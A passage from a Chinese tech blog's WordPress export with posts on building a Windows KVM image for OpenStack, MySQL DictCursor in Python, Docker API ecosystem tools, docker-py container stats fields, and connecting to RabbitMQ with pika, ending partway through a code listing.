<pre>/usr/libexec/qemu-kvm -m 2048 -cdrom cn_windows_7_ultimate_x86_dvd_x15-65907.iso -drive file=Windows_7_ultimate_x86.qcow2,if=virtio -boot c -drive file=virtio-win-0.1.102.iso,index=3,media=cdrom -boot order=d,menu=on -device virtio-net-pci -net nic,model=virtio -net user -usb -usbdevice tablet -nographic -vnc :10</pre>

<span style="font-size: 12pt;">依旧使用 vncviewer 连接操作：</span>
<span style="font-size: 12pt;">选择自定义之后，会发现磁盘没有识别，是因为我们还没安装驱动，点击加载驱动。</span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/HSE1HXNDCJNHHEG7S0E.png"><img class="size-full wp-image-1553 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/HSE1HXNDCJNHHEG7S0E.png" alt="hse1hxndcjnhheg7s0e" width="1002" height="821" /></a>
<span style="font-size: 12pt;">磁盘驱动文件位置：<code>viostor\w7\x86</code></span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/43PM2N_@S3ZTMOC6I.png"><img class="size-full wp-image-1554 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/43PM2N_@S3ZTMOC6I.png" alt="43pm2n_s3ztmoc6i" width="1002" height="821" /></a>
然后我们还需要安装网卡驱动，驱动文件位置：<code>NetKVM\w7\x86</code>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/09/ED71A7HWRB@YQDVVHQD6L09.png"><img class="size-full wp-image-1555 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/ED71A7HWRB@YQDVVHQD6L09.png" alt="ed71a7hwrbyqdvvhqd6l09" width="1002" height="821" /></a>
<span style="font-size: 12pt;">然后执行正常系统安装步骤即可。</span>
<span style="font-size: 12pt;">再进行一次压缩：</span>

<pre>qemu-img convert -c -O qcow2 Windows_7_ultimate_x86.qcow2 Windows_7_ultimate_x86_new.qcow2</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1540</wp:post_id>
		<wp:post_date><![CDATA[2016-09-13 09:08:46]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-09-13 01:08:46]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[openstack%e9%95%9c%e5%83%8f%e5%88%b6%e4%bd%9cwindows%e5%92%8clinux]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[197]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Python之MySQL的Select操作返回Dict类型</title>
		<link>https://www.nervgeek.com/2016/09/24/python%e4%b9%8bmysql%e7%9a%84select%e6%93%8d%e4%bd%9c%e8%bf%94%e5%9b%9edict%e7%b1%bb%e5%9e%8b/</link>
		<pubDate>Sat, 24 Sep 2016 12:17:53 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1558</guid>
		<description></description>
		<content:encoded><![CDATA[<span style="font-size: 12pt;">之前不知道 Select 操作可以获取 Dict 类型，每次取出 Select 返回的 Tuple 都是用下标来取的。只要修改过数据库那下标又不一样，那就要大幅修改 Jinja2 和代码了。假如取出的是 Dict ，那我写模板或者程序的时候，只需要指定字段名即可读取数据，即使修改数据库也不担心数据错乱，而且还大幅提高了程序可读性。</span>
<span style="font-size: 12pt;">方法非常简单，一句搞定：</span>

<pre>cur = self.__db.cursor(cursorclass = MySQLdb.cursors.DictCursor)</pre>

<span style="font-size: 12pt;">只需要 cursorclass = MySQLdb.cursors.DictCursor 即可！</span>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1558</wp:post_id>
		<wp:post_date><![CDATA[2016-09-24 20:17:53]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-09-24 12:17:53]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[python%e4%b9%8bmysql%e7%9a%84select%e6%93%8d%e4%bd%9c%e8%bf%94%e5%9b%9edict%e7%b1%bb%e5%9e%8b]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="mysql"><![CDATA[MySQL]]></category>
		<category domain="category" nicename="python"><![CDATA[Python]]></category>
		<category domain="post_tag" nicename="python"><![CDATA[python]]></category>
		<category domain="category" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[107]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>基于Docker API 构建的工具[转]</title>
		<link>https://www.nervgeek.com/2016/09/28/%e5%9f%ba%e4%ba%8edocker-api-%e6%9e%84%e5%bb%ba%e7%9a%84%e5%b7%a5%e5%85%b7/</link>
		<pubDate>Wed, 28 Sep 2016 14:05:46 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1562</guid>
		<description></description>
		<content:encoded><![CDATA[Docker 是一个流行的新技术来让开发团队将应用嵌入虚拟化的容器内，以便于构建和部署。<a href="http://nordicapis.com/api-driven-devops-spotlight-on-docker">我们之前</a>已经看到Docker怎样降低<a href="http://nordicapis.com/defining-the-emerging-role-of-devops/">DevOps</a> 工作流的复杂性，并且鼓励保持基础设施的不变性，整个应用与它的基础操作系统一起，作为一个轻量级容器，对应用的每次改变进行重新创建和重新部署，而不是依靠增量更新。
在过去三年Docker 取得了令人瞩目的成功，得益于它的远程API，Docker 成为一个流行的开发者构建各种软件的平台也是必然的。
保持Docker 自己的理念，新生态系统的第三方开发者已经贡献了许多开源项目。在本文中，我们回顾这些项目，看看它们是怎样使用Docker API 的。

<h2>内部测试</h2>

Docker API最主要的用户是Docker 自己——他们采用有用的结构开发了一系列的工具来联合和编排Docker 容器。<a href="https://docs.docker.com/compose/">Docker Compose</a> 便于多容器应用的部署，而<a href="https://docs.docker.com/swarm/overview/">Docker Swarm</a> 允许创建Docker 容器集群。

<div class="clear"></div>

尽管Docker 自己活跃在这个领域，他们也欢迎其他的参与者在策划Docker 容器上的贡献。策划是一个广义的术语，但是我们能将其拆分为调度、集群、服务发现，和一些其他工作。
通常，为了效率、透明度和避免依赖的紧耦合，不希望多个进程运行在同一个Docker 容器内部。为每个容器保留限制在一个单一的职责，并为基础设施的其余部分提供一个明确定义的服务，这样做更实际。所以一个完整的应用通常需要一批Docker 容器，大量的新解决方案用来解决其带来的复杂性。
<!--more-->

<h2>调度</h2>

Docker 容器的调度也是容器策划的一个重要方面。本文中的调度是指运行在给定主机上的容器的规则。例如，一个调度策略可能需要两个在功能上相互协作的容器运行在相同的主机上。由于这个策略，当定义集群行为时，这两个容器能够被抽象出来作为一个单独的应用。
除了Docker Swarm 的调度功能以外，<a href="https://github.com/coreos/fleet">CoreOS 的Fleet</a> 和<a href="https://mesosphere.github.io/marathon/docs/native-docker.html">Marathon</a> 是开源的Docker 调度器的范例。

<h2>集群管理</h2>

集群需要管理一批Docker 主机作为一个整体，这样它们能作为一个单独的系统来一起操作。
有一些Docker Swarm 的开源替代产品，比如<a href="http://kubernetes.io/">Google 的Kubernetes</a>，能够让团队定义Docker 容器的<code>pods</code>。其他的包括 <a href="http://shipyard-project.com/">Shipyard</a>、<a href="https://coreos.com/fleet/docs/latest/launching-containers-fleet.html">CoreOS 的Fleet</a> 和 <a href="https://mesosphere.github.io/marathon/">Marathon</a>。
比如<a href="https://github.com/spotify/helios">Spotify</a> 公司已经开发并且开源了他们自己的Docker 容器管理系统，这需要为每个用例很好地适配基于Docker 的系统。

<h2>服务发现</h2>

服务发现是指在网络上发现与服务相关的IP 地址，在多主机的集群环境中，这是一个很复杂的过程。
有些公司比如<a href="http://gliderlabs.com/">GliderLabs</a> 已经利用Docker 的远程API 来监听事件，创建围绕基于容器的软件的工具。<a href="https://github.com/gliderlabs/registrator">Registrator</a>，一个Weave 提供的开源项目，通过检查最新创建的Docker 容器来完善服务发现，并注册新的服务到<a href="https://www.consul.io/">Consul</a>这样的目录中。

<h2>网络</h2>

为了连接应用的Docker 容器，Docker 有一些<a href="https://docs.docker.com/engine/userguide/networking/dockernetworks/">网络功能</a>。虚拟桥接网络是默认启用的，但是有一些配置选项。供应商对于不同的用例提供了不同的可替代的网络配置。
<a href="https://www.weave.works/">Weave</a> 创建一个微型路由的虚拟网络来连接跨多个主机的容器。这带来了更简单的网络配置，动态添加节点到网络中，以及加密的通信。Weave 还提供额外的服务，比如网络监控产品Weave Scope。
<a href="https://github.com/coreos/flannel">Flannel</a>，一个CoreOS 开源的虚拟网络解决方案，创建一个overlay 网络，并使用Etcd 集群来存储网络配置。
<a href="https://github.com/projectcalico/calico-containers">Calico 项目</a> 是另一个用于Docker 容器的开源的网络解决方案，完全基于第三层的方式，这意味着它不是一个overlay 网络，即在<a href="http://nordicapis.com/living-in-the-cloud-stack-understanding-saas-paas-and-iaas-apis/">OSI 模型的第三层</a>之上没有封装包。相对于其他解决方案，这有助于提高性能。

<h2>存储</h2>

Docker 调解了不可变基础设施爱好者的一个难题，即数据库。数据库中的数据按照定义是可变的，所以一个数据库容器不能简单地从头开始重新创建和重新部署而不影响数据库的完整性。
这个问题Docker 也有原生的解决方案，即<a href="https://docs.docker.com/engine/userguide/containers/dockervolumes/">数据卷和数据卷容器</a> 的方式。数据卷是持久化的，在删除它们连接的容器后依然保留，并且它们包含的数据在整个Docker 生命周期中不被损坏。数据卷容器能够被用来跨多个容器共享数据。
数据卷能够备份和恢复，比如ClusterHQ 的<a href="https://clusterhq.com/flocker/introduction/">Flocker</a>，开源的数据卷管理器，管理数据卷和容器，以及进行数据迁移来支持基于容器的生产数据库。

<h2>持续集成</h2>

很多持续集成（CI）领域的工具能更好的处理Docker 容器的构建、测试和部署周期。例如，<a href="https://codefresh.io/">CodeFresh</a> 能够通过检测Git 仓库的更改或者是持续集成服务器的新的构建，用来触发创建和部署Docker 容器。
<a href="https://blog.codeship.com/introducing-jet-codeships-platform-for-docker/">CodeShip 的 Jet</a> 是一个新的用于Docker 的CI 平台。它能从任意的Docker 仓库中拉取镜像，并且集成Docker Compose 来简化并发构建和部署基于容器的应用。
<a href="https://github.com/drone/drone">Drone</a> 是另一个构建于Docker 之上的持续交付平台，在构建过程中使用临时容器。

<h2>托管Docker 仓库</h2>

除了DockerHub 以外，有几家公司提供<a href="http://rancher.com/comparing-four-hosted-docker-registries/">托管Docker 仓库</a>，比如<a href="https://quay.io/">Quay.io</a>、<a href="https://www.jfrog.com/artifactory/">Artifactory</a> 以及<a href="https://cloud.google.com/container-registry/">Google 的 Container Registry</a>。这些服务作为容器的私有仓库，提供仓库的高级特性、第三方集成，以及为DevOps 工程师提供不受干扰的用户体验。

<h2>日志聚合</h2>

<a href="https://github.com/gliderlabs/logspout">Logspout</a> 是GliderLabs 的另一个开源项目。当多个Docker 容器共享一台主机服务器时，Logspout 进行日志路由，将其聚合到一个日志管理系统中，比如<a href="https://papertrailapp.com/">PaperTrail</a>。同样，<a href="https://github.com/bargenson/docker-filebeat">Filebeat</a> 记录容器的日志并发送到Logstash 中。

<h2>监控</h2>

基于Docker 的应用的第三方监控解决方案有一些可用的选择，由一些云监控领域的大牌公司构建。利用Docker 的统计API，他们在详细的仪表板上显示数据结果。
这些监控解决方案的例子包括：

<ul>
    <li><a href="https://community.appdynamics.com/t5/eXchange-Community-AppDynamics/Docker-Monitoring-Extension/idi-p/14749">AppDynamics 的Docker 扩展</a>;</li>
    <li>启用Docker 的<a href="https://www.datadoghq.com/">DataDog 代理</a>；</li>
    <li><a href="https://blog.newrelic.com/2015/05/06/docker-support-2/">New Relic 中一等市民待遇的Docker 容器</a>;</li>
    <li>以及<a href="https://hub.docker.com/r/scoutapp/docker-scout/">Scout 的Docker 代理</a>，它本身作为Docker 镜像发布。</li>
</ul>

<h2>配置管理</h2>

Docker 允许你通过<strong>标签</strong>给镜像、容器和进程<a href="https://docs.docker.com/engine/userguide/labels-custom-metadata/">增加定制的元数据</a>。标签是键值对，用于指定定制配置，比如版本和具体的环境变量。
为了避免命名冲突，Docker 鼓励在标签中使用命名空间，但是并不强制要求。<a href="https://github.com/garethr/docker-label-inspector">Docker 标签检查器</a>是由<a href="https://twitter.com/garethr">Gareth Rushgrove</a>，<a href="https://puppetlabs.com/">Puppet Labs</a>的高级工程师，提供的一个工具，用来检查已经发布的Docker 镜像是否违背这一指南或者是给定的JSON 样式。

<h2>安全审计</h2>

对容器应用的安全已经有一些疑问，虽然这些年Docker 自己已经封堵了许多漏洞，不过供应商已经提供了一些解决方案来增强Docker 应用的安全性。一个例子是<a href="https://www.scalock.com/">Scalock</a> 公司，开发软件来扫描容器的安全问题，控制容器的访问，并且在运行时监控容器来确保它们没有超过它们的授权设置。

<h2>PaaS</h2>

大量的基于Docker 的新软件已经引发了<a href="http://blog.heavybit.com/blog/2015/3/23/dockermeetup">如何把这些工具整合在一起的新难题</a>，但是这是一个成熟的生态系统的征兆。少数几家公司野心勃勃地押注在创建一个端到端的像PaaS 这样的解决方案，用来构建、部署、编排和监控基于Docker 的应用，从而隐藏所有的这些复杂性。
<a href="https://www.openshift.com/">Openshift</a> 是<a href="http://www.redhat.com/">RedHat</a> 的PaaS 解决方案，构建在Docker 和Kubernetes 之上。<a href="http://deis.io/overview/">Deis</a> 是<a href="https://www.engineyard.com/">Engine Yard</a>基于Dockerand CoreOS 的Heroku 风格的PaaS 解决方案。<a href="https://github.com/paz-sh/paz">Paz</a> 是基于Docker、CoreOS、EtcD 和Fleet 的开源项目，让团队负责他们自己的容器应用的PaaS 工作流。
最后，Docker 不久前已经收购了Tutum ——一个部署和管理Docker 容器的PaaS 套件，并将其改名为<a href="https://cloud.docker.com/">Docker Cloud</a>。

<h2>成熟的OS</h2>

Docker 是如此的流行，以至于有些人已经在尝试创建由Docker 容器组成的完整操作系统。
<a href="http://rancher.com/">Rancher</a> 的RancherOS 是一个轻量级的操作系统，完全由Docker 容器组成。它是一个设计用于运行基于容器的应用的Linux 发行版，大小仅20MB。
<a href="http://blog.hypriot.com/post/get-your-all-in-one-docker-playground-now-hypriotos-reloaded/">HypriotOS</a> 是一个用于<a href="https://www.raspberrypi.org/">树莓派</a>的Docker 场景。它允许你在这些微型计算机上部署容器应用，由能够安装在SD 卡上的轻量级镜像组成。

<h2>结尾</h2>

Docker 的出现赋予了DevOps 软件生态系统的新生。因为基于容器的应用（相对于<a href="http://www.networkworld.com/article/3031020/virtualization/containers-vs-vms-it-comes-down-to-state-management-networking-and-sprawl.html">基于虚拟机</a>）的增长所带来的份额，它在未来将会继续保持增长。
在后面的文章中，我们将探讨DevOps 的其他组成，即持续集成和配置管理，所以<a href="https://twitter.com/NordicAPIs">关注我们</a>，注册我们的<a href="http://nordicapis.com/newsletter/">简报</a>来保持更新。
<strong>查看英文链接：</strong><a href="http://nordicapis.com/tools-built-on-top-of-the-docker-api/">tools built on top of the docker api</a>

<hr />

感谢<a href="http://www.infoq.com/cn/author/%E9%99%88%E5%85%B4%E7%92%90">陈兴璐</a>对本文的审校。
转自：<a href="http://www.infoq.com/cn/articles/tools-built-on-top-of-the-docker-api?utm_campaign=rightbar_v2&amp;utm_source=infoq&amp;utm_medium=articles_link&amp;utm_content=link_text">http://www.infoq.com/cn/articles/tools-built-on-top-of-the-docker-api?utm_campaign=rightbar_v2&amp;utm_source=infoq&amp;utm_medium=articles_link&amp;utm_content=link_text</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1562</wp:post_id>
		<wp:post_date><![CDATA[2016-09-28 22:05:46]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-09-28 14:05:46]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%9f%ba%e4%ba%8edocker-api-%e6%9e%84%e5%bb%ba%e7%9a%84%e5%b7%a5%e5%85%b7]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
		<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[189]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>探索Docker-py中stats函数返回的JSON信息</title>
		<link>https://www.nervgeek.com/2016/10/06/%e6%8e%a2%e7%b4%a2docker-py%e4%b8%adstats%e5%87%bd%e6%95%b0%e8%bf%94%e5%9b%9e%e7%9a%84json%e4%bf%a1%e6%81%af/</link>
		<pubDate>Thu, 06 Oct 2016 05:53:38 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1569</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>{
    'blkio_stats': {
    'io_service_time_recursive': [
    
    ],
    'sectors_recursive': [
    ],
    'io_service_bytes_recursive': [
    {
        'major': 8,
        'value': 81920,
        'minor': 0,
        'op': u'Read'
    },
    {
        'major': 8,
        'value': 0,
        'minor': 0,
 u'op': u'Write'
 },
 {
 u'major': 8,
 u'value': 0,
 u'minor': 0,
 u'op': u'Sync'
 },
 {
 u'major': 8,
 u'value': 81920,
 u'minor': 0,
 u'op': u'Async'
 },
 {
 u'major': 8,
 u'value': 81920,
 u'minor': 0,
 u'op': u'Total'
 }
 ],
 u'io_serviced_recursive': [
 {
 u'major': 8,
 u'value': 4,
 u'minor': 0,
 u'op': u'Read'
 },
 {
 u'major': 8,
 u'value': 0,
 u'minor': 0,
 u'op': u'Write'
 },
 {
 u'major': 8,
 u'value': 0,
 u'minor': 0,
 u'op': u'Sync'
 },
 {
 u'major': 8,
 u'value': 4,
 u'minor': 0,
 u'op': u'Async'
 },
 {
 u'major': 8,
 u'value': 4,
 u'minor': 0,
 u'op': u'Total'
 }
 ],
 u'io_time_recursive': [
 ],
 u'io_queue_recursive': [
 ],
 u'io_merged_recursive': [
 ],
 u'io_wait_time_recursive': [
 ]
 },
 u'precpu_stats': {
 u'cpu_usage': {
 u'usage_in_usermode': 0,
 u'total_usage': 0,
 u'percpu_usage': None,
 u'usage_in_kernelmode': 0
 },
 u'system_cpu_usage': 0,
 u'throttling_data': {
 u'throttled_time': 0,
 u'periods': 0,
 u'throttled_periods': 0
 }
 },
 u'read': u'2016-10-06T13: 42: 12+08: 00',
 u'memory_stats': {
 u'usage': 98971648,
 u'limit': 1022758912,
 u'failcnt': 0,
 u'stats': {
 u'unevictable': 0,
 u'total_inactive_file': 16539648,
 u'total_rss_huge': 0,
 u'writeback': 0,
 u'total_cache': 98488320,
 u'total_mapped_file': 0,
 u'mapped_file': 0,
 u'pgfault': 2165,
 u'total_writeback': 0,
 u'hierarchical_memory_limit': 9223372036854771712,
 u'total_active_file': 81911808,
 u'rss_huge': 0,
 u'cache': 98488320,
 u'active_anon': 8192,
 u'pgmajfault': 1,
 u'total_pgpgout': 1676,
 u'pgpgout': 1676,
 u'total_active_anon': 8192,
 u'total_unevictable': 0,
 u'total_pgfault': 2165,
 u'total_pgmajfault': 1,
 u'total_inactive_anon': 512000,
 u'inactive_file': 16539648,
 u'pgpgin': 25839,
 u'total_dirty': 0,
 u'total_pgpgin': 25839,
 u'rss': 483328,
 u'active_file': 81911808,
 u'inactive_anon': 512000,
 u'dirty': 0,
 u'total_rss': 483328
 },
 u'max_usage': 99844096
 },
 u'pids_stats': {
 },
 u'networks': {
 u'eth0': {
 u'tx_dropped': 0,
 u'rx_packets': 56,
 u'rx_bytes': 4440,
 u'tx_errors': 0,
 u'rx_errors': 0,
 u'tx_bytes': 648,
 u'rx_dropped': 0,
 u'tx_packets': 8
 }
 },
 u'cpu_stats': {
 u'cpu_usage': {
 u'usage_in_usermode': 20000000,
 u'total_usage': 846876500,
 u'percpu_usage': [
 846876500
 ],
 u'usage_in_kernelmode': 880000000
 },
 u'system_cpu_usage': 161956730000000,
 u'throttling_data': {
 u'throttled_time': 0,
 u'periods': 0,
 u'throttled_periods': 0
 }
 }
}</pre>

<strong><span style="font-size: 14pt;">内存相关信息：</span></strong>
memory.usage_in_bytes 已使用的内存量(包含cache和buffer)(字节)，相当于linux的used_meme
memory.limit_in_bytes 限制的内存总量(字节)，相当于linux的total_mem
memory.failcnt 申请内存失败次数计数
memory.memsw.usage_in_bytes 已使用的内存和swap(字节)
memory.memsw.limit_in_bytes 限制的内存和swap容量(字节)
memory.memsw.failcnt 申请内存和swap失败次数计数
memory.stat 内存相关状态
<strong><span style="font-size: 14pt;">磁盘相关信息：</span></strong>
blkio.time：统计cgroup对设备的访问时间，按格式device_types:node_numbers milliseconds读取信息即可，以下类似。
blkio.io_serviced：统计cgroup对特定设备的IO操作（包括read、write、sync及async）次数，格式device_types:node_numbers operation number
blkio.sectors：统计cgroup对设备扇区访问次数，格式device_types:node_numbers sector_count
blkio.io_service_bytes：统计cgroup对特定设备IO操作（包括read、write、sync及async）的数据量，格式device_types:node_numbers operation bytes
blkio.io_queued：统计cgroup的队列中对IO操作（包括read、write、sync及async）的请求次数，格式number operation
blkio.io_service_time：统计cgroup对特定设备的IO操作（包括read、write、sync及async）时间(单位为ns)，格式device_types:node_numbers operation time
blkio.io_merged：统计cgroup 将 BIOS 请求合并到IO操作（包括read、write、sync及async）请求的次数，格式number operation
blkio.io_wait_time：统计cgroup在各设备中各类型IO操作（包括read、write、sync及async）在队列中的等待时间(单位ns)，格式device_types:node_numbers operation time
继续探索中...
<span style="font-size: 12pt;">参考资料：<a href="https://segmentfault.com/a/1190000002811652">https://segmentfault.com/a/1190000002811652</a> - Docker 监控的一点想法</span>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1569</wp:post_id>
		<wp:post_date><![CDATA[2016-10-06 13:53:38]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-10-06 05:53:38]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e6%8e%a2%e7%b4%a2docker-py%e4%b8%adstats%e5%87%bd%e6%95%b0%e8%bf%94%e5%9b%9e%e7%9a%84json%e4%bf%a1%e6%81%af]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[197]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Python连接、操作Rabbit MQ队列</title>
		<link>https://www.nervgeek.com/2016/11/09/python%e8%bf%9e%e6%8e%a5%e3%80%81%e6%93%8d%e4%bd%9crabbit-mq%e9%98%9f%e5%88%97/</link>
		<pubDate>Wed, 09 Nov 2016 09:25:45 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1586</guid>
		<description></description>
		<content:encoded><![CDATA[在网上，非常少关于 Python 连接操作 Rabbit MQ 的详细信息，pika 文档也是没有汉化，避免以后忘记用法又找一遍教程的尴尬，还是先记下来了，而且最近也没更新什么博文...
前提基础先不写了，先写一下前期容易混淆的，因为我是直接上手 Python 操作 Rabbit MQ，没有系统学过。
假如使用：

<pre>connection = pika.BlockingConnection(pika.ConnectionParameters('localhost'))
channel = connection.channel()</pre>

连接 Rabbit MQ，默认是 Guest 用户走 / 的 vhost 。假如你想要我需要 worker 提供账号密码，在指定的 vhost 才能获取信息，那么你需要自己新建一个用户，一个vhost，给用户在你需要的vhost里面操作的权限。

<pre>## 创建一个名为 “dockerm_vhost” 的 vhost
## 创建一个名为 “dockerm” 密码为 “123456” 的用户，并把他添加到 “dockerm_vhost” 里面
## 给予 “dockerm” administrator 角色
rabbitmqctl add_vhost dockerm_vhost
rabbitmqctl add_user dockerm 123456
rabbitmqctl set_permissions -p "dockerm_vhost" dockerm ".*" ".*" ".*"
rabbitmqctl set_user_tags dockerm administrator</pre>

创建好之后，就可以在 Python 脚本里面指定 vhost 和用户密码来操作了。

<pre>credentials = pika.PlainCredentials('dockerm', '123456')
connection = pika.BlockingConnection(pika.ConnectionParameters('127.0.0.1',5672,"dockerm_vhost",credentials))
channel = connection.channel()</pre>

&nbsp;
使用路由，如果没有人接收，即没有对应的routing_key，信息会立马被抛弃。
&nbsp;
2016.11.14更：
多线程消费 Rabbit MQ 队列引起的 Rabbit MQ 和脚本的 CPU 负载过高。
先贴出修改前的代码：

<pre>#!/usr/bin/env python
#coding=utf8
import pika, sys,os,signal,json
import Config
import threading,sys
from lib.Control import MySQLControl
from time import sleep
class Watcher():
 def __init__(self):
